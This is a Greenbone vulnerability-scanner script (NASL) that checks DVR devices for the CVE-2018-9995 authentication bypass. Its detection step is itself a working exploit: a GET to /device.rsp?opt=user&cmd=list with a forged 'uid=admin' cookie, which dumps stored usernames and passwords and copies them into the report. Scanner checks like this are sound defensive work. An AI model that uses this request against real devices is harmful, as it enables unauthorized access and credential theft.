# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141061");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2018-05-03 13:51:37 +0700 (Thu, 03 May 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)");

  script_cve_id("CVE-2018-9995");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Multiple DVR Products Authentication Bypass Vulnerability (Apr 2018) - Active Check");

  script_category(ACT_GATHER_INFO);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"Multiple DVR devices allow remote attackers to bypass
  authentication via a crafted cookie header.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"TBK DVR devices as well as rebranded variants from Novo,
  CeNova, QSee, Pulnix, XVR 5 in 1, Securus and Night OWL are known to be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one.");

  script_xref(name:"URL", value:"http://misteralfa-hack.blogspot.cl/2018/04/tbk-vision-dvr-login-bypass.html");
  script_xref(name:"URL", value:"https://fortiguard.fortinet.com/outbreak-alert/tbk-dvr-attack");
  script_xref(name:"URL", value:"https://github.com/ezelf/CVE-2018-9995_dvr_credentials");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("list_array_func.inc");

port = http_get_port(default: 80);

banner = http_get_remote_headers(port: port, file: "/login.rsp");
res = http_get_cache(item: "/", port: port);

if (banner !~ "Server\s*:\s*GNU rsp" && res !~ "Location\s*:\s*/login\.rsp")
  exit(0);

url = "/device.rsp?opt=user&cmd=list";
cookie = "uid=admin";

req = http_get_req(port: port, url: url, add_headers: make_array("Cookie", cookie));
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if ('{"result":0' >< res && '"uid"' >< res) {

  info["HTTP method"] = "GET";
  info["Cookie"] = cookie;
  info["URL"] = http_report_vuln_url(port: port, url: url, url_only: TRUE);

  report  = 'By doing the following request:\n\n';
  report += text_format_table(array: info) + '\n\n';
  report += 'it was possible to bypass the authentication and list the available users and their passwords.\n\n' +
           'Result:\n' + res;
  expert_info = 'Request:\n'+ req + '\nResponse:\n' + res;
  security_message(port: port, data: report, expert_info: expert_info);
  exit(0);
}

exit(99);
